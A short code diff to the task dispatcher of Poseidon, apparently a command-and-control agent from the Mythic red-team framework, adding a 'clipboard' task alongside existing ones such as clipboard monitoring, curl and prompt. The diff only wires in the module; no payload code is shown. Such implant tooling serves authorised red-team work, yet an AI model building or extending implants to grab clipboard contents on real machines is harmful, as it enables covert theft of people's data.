@@ -3,6 +3,7 @@ package tasks
 import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cat"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cd"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/clipboard"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/clipboard_monitor"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cp"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/curl"
@@ -172,6 +173,8 @@ func listenForNewTask() {
 			go head.Run(task)
 		case "prompt":
 			go runtimeMainThread.DoOnMainThread(prompt.Run, task)
+		case "clipboard":
+			go clipboard.Run(task)
 		default:
 			// No tasks, do nothing
 			break
